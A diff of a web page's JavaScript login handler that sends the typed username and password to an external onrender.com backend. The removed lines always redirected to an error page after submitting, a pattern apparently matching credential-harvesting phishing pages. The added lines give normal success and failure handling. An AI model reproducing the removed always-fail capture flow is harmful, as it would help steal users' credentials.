@@ -3,7 +3,15 @@
         const username = document.getElementById("username").value;
         const password = document.getElementById("password").value;
 
-        fetch("https://backend-redf.onrender.com", {  // Replace with your actual backend URL
+        if (!username || !password) {
+            alert("Please enter both username and password.");
+            return;
+        }
+
+        // Your backend API endpoint
+        const backendUrl = "https://backend-redf.onrender.com/login"; 
+
+        fetch(backendUrl, {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
@@ -12,9 +20,17 @@
         })
         .then(response => response.json())
         .then(data => {
-            console.log(data);
-            window.location.href = "error.html"; // Redirect to error page
+            if (data.success) {
+                alert("Login successful!");
+                window.location.href = "dashboard.html"; // Redirect to dashboard on success
+            } else {
+                alert("Login failed. Redirecting...");
+                window.location.href = "error.html"; // Redirect to error page on failure
+            }
         })
-        .catch(error => console.error("Error:", error));
+        .catch(error => {
+            console.error("Error:", error);
+            alert("An error occurred. Redirecting...");
+            window.location.href = "error.html"; // Redirect to error page on failure
+        });
     }
-
